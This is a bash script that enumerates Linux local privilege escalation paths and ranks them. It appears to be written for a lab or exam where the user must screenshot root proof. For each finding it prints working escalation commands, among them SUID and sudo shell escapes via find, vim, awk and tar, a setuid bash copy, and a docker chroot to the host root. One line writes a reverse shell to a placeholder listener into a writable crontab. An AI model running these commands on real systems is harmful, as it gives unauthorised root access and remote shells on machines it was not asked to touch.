#!/usr/bin/env bash
# linux_privesc.sh — find and rank local privilege escalation paths, fast.
#
# Read-only by default. It prints the finding, the exact command to try, and what success
# looks like, so you can run the escalation yourself and screenshot the proof.
#
# Usage:
#   bash linux_privesc.sh             # enumerate, ranked
#   bash linux_privesc.sh --quiet     # findings only, for a narrower screenshot
#
# The two paths that come up most often in these pods, in order:
#   1. sudo misconfiguration  (sudo -l shows ALL, NOPASSWD, or a binary you can hijack)
#   2. SUID binary that still has its GTFOBins magic (find, vim, less, awk, python...)
# Everything else below is a candidate, not a guarantee.

set -u
QUIET=0
[ "${1:-}" = "--quiet" ] && QUIET=1
FOUND=0

hr()  { [ "$QUIET" -eq 0 ] && { echo; echo "---- $* ----"; }; }
hit() { echo "  [VULN] $*"; FOUND=$((FOUND+1)); }
try() { echo "         try: $*"; }

echo "=== linux_privesc.sh  host=$(hostname)  user=$(id -un)  kernel=$(uname -r) ==="
echo "=== uid line: $(id) ==="

# --------------------------------------------------------------- 1. sudo
hr "sudo rules"
if command -v sudo >/dev/null 2>&1; then
  SUDO_OUT="$(sudo -n -l 2>/dev/null || sudo -l 2>/dev/null)"
  echo "$SUDO_OUT" | sed 's/^/  /' | head -20
  if echo "$SUDO_OUT" | grep -qE '\(ALL(:ALL)?\) (NOPASSWD: )?ALL'; then
    hit "sudo allows everything"
    try "sudo -i    then  id    (expect uid=0)"
  elif echo "$SUDO_OUT" | grep -q 'NOPASSWD'; then
    hit "NOPASSWD sudo entry present"
    echo "$SUDO_OUT" | grep 'NOPASSWD' | sed 's/^/         /'
  elif echo "$SUDO_OUT" | grep -qE '/(find|vim|vi|less|more|awk|man|nano|tar|python3?|perl|env|ftp|gdb)$'; then
    hit "sudo on a binary with a known escape"
    echo "$SUDO_OUT" | grep -E '/(find|vim|less|awk|nano|tar|python3?|perl|env)$' | sed 's/^/         /'
    try "sudo /usr/bin/find . -exec /bin/sh -p \\; -quit"
  fi
else
  echo "  sudo not installed"
fi

# --------------------------------------------------------------- 2. SUID
hr "SUID binaries"
SUIDS="$(find / -perm -4000 -type f 2>/dev/null)"
echo "$SUIDS" | sed 's/^/  /' | head -25
for b in find vim vi nano less more awk man tar python3 python perl env gdb ftp nmap cp mv bash sh; do
  if echo "$SUIDS" | grep -qE "/$b$"; then
    hit "SUID $b"
    case "$b" in
      find)   try "/usr/bin/find . -exec /bin/sh -p \\; -quit" ;;
      vim|vi) try "vim -c ':!/bin/sh'" ;;
      less|more|man) try "$b /etc/hostname  then  !/bin/sh" ;;
      awk)    try "awk 'BEGIN {system(\"/bin/sh\")}'" ;;
      nmap)   try "nmap --interactive  then  !sh" ;;
      cp)     try "cp /bin/bash /tmp/rootbash ; chmod +s /tmp/rootbash ; /tmp/rootbash -p" ;;
      tar)    try "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh" ;;
      python3|python|perl|env|nano|gdb|ftp|bash|sh) try "$b (GTFOBins entry for this binary)" ;;
    esac
  fi
done

# ---------------------------------------------------------- 3. capabilities
hr "file capabilities"
CAPS="$(getcap -r / 2>/dev/null)"
if [ -n "$CAPS" ]; then echo "$CAPS" | sed 's/^/  /' | head -15
  echo "$CAPS" | grep -q 'cap_setuid' && { hit "capability cap_setuid present"; try "see GTFOBins for that binary"; }
else echo "  none"; fi

# ---------------------------------------------------------------- 4. cron
hr "cron and timers you might write to"
ls -la /etc/cron* 2>/dev/null | head -15
[ -w /etc/crontab ] && { hit "/etc/crontab is writable"; try "echo '* * * * * root bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"' >> /etc/crontab"; }
for d in /etc/cron.d /etc/cron.hourly /var/spool/cron/crontabs; do
  [ -w "$d" ] && { hit "$d is world-writable"; }
done
systemctl list-timers --all 2>/dev/null | head -8 | sed 's/^/  /'

# ------------------------------------------------- 5. writable units, PATH
hr "writable service files and PATH"
find /etc/systemd/system -writable -type f 2>/dev/null | head -10 | sed 's/^/  [VULN] writable unit: /'
find /usr/lib/systemd/system -writable -type f 2>/dev/null | head -5 | sed 's/^/  [VULN] writable unit: /'
IFS=:; for d in $PATH; do [ -w "$d" ] && hit "PATH directory writable: $d"; done; unset IFS

# ------------------------------------------------------- 6. other classics
hr "other classic vectors"
[ -w /etc/passwd ] && hit "/etc/passwd writable (add a uid 0 user)"
[ -r /etc/shadow ] && hit "/etc/shadow readable"
id -nG 2>/dev/null | grep -qw docker && { hit "member of docker group"; try "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"; }
id -nG 2>/dev/null | grep -qw lxd  && hit "member of lxd group"
grep -q 'no_root_squash' /etc/exports 2>/dev/null && hit "NFS export with no_root_squash"
find / -name '*.bak' -o -name '*~' -o -name '*.old' 2>/dev/null | grep -vE '/(proc|sys|usr/share)' | head -5 | sed 's/^/  candidate backup file: /'

# ------------------------------------------------------------ 7. kernel
hr "kernel and likely CVEs"
echo "  kernel $(uname -r)"
K="$(uname -r)"
case "$K" in
  5.8*|5.9*|5.10*|5.11*|5.12*|5.13*|5.14*|5.15*|5.16*) echo "  [!] possible Dirty Pipe range (5.8 to 5.16.x)" ;;
  5.[0-7]*|4.*) echo "  [!] possible PwnKit / Baron Samedit era, check pkexec and sudo versions" ;;
esac
if command -v pkexec >/dev/null 2>&1; then echo "  pkexec version: $(pkexec --version 2>&1 | head -1)"; fi
echo "  sudo version:   $(sudo --version 2>/dev/null | head -1)"

# -------------------------------------------------------------- summary
echo
echo "=== SUMMARY: $FOUND candidate path(s) ==="
echo "Pick two different ones for the report. For each, capture: the finding, the command, and id showing uid=0."
echo "Do not run anything that writes to system paths until you have your screenshots of the enumeration."
